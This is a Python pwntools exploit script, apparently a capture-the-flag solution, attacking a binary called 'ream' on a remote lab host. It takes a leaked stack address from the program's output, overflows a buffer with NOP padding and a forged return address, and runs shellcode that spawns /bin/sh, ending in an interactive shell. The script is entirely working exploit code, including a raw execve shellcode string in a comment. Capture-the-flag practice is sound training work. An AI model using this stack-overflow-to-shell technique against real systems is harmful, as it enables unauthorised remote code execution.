from pwn import *
import string
context.log_level = "debug"
context.arch = "amd64"
context.endian = "little"
context.binary = ELF('./ream')
# p = process("./ream")

p = remote("sisterlab.id", 42071)
shellcode = asm(shellcraft.sh())
# shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"



leak = p.recvuntil(b"Well")
leak = leak[29:]
leak = leak[:-5]
leak = int(leak, 16)

stack = leak + 23 + 8
stack = p64(stack)

print("stack = ", stack)

p.sendlineafter(b"> ", b"n")


payload = b"\x90"*23
payload += stack
payload += shellcode


# with open("payload.txt", "wb") as f:
#     f.write(payload)


p.sendlineafter(b"> ", payload)
p.interactive()